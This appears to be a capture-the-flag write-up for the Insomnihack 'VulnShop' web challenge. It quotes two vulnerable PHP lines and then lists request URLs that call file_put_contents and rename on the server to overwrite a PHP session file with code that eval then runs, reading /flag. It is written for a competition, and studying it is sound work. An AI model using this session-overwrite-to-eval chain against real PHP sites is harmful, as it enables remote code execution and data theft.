# VulnShop (WEB)

+Task+
We're preparing a website for selling some important vulnerabilities in the future. You can browse some static pages on it, waiting for the official release.
http://vulnshop.teaser.insomnihack.ch

+Soluton+

[1] This line of code allows us to execute arbitrary function with arbitrary second argument. First argument is name of temp file.
```php
$_REQUEST['method']("./".$_SESSION['challenge'], $_REQUEST['answer']); 
```
[2] This line of code allows us to eval code in SESSION variable.
```php
if(eval("return ".$_SESSION['challenge']." ;") === $response) return true; 
```
So we need to rewrite SESSION variable.

* Generate SESSION_ID and create temp file /tmp - http://vulnshop.teaser.insomnihack.ch/?page=contactus
* Write php-code (which serialized into string) into temp-file [1] - http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=file_put_contents&answer=challenge|s:35:"print_r(file_get_contents('/flag'))";
* Rewrite own session file by temp-file [1] - http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=rename&answer=/var/lib/php/sessions/sess_b26cv2ap9haj27pf2t8rievn43
* Execute code in session file [2] - http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify&method=verifyFromMath&answer=1
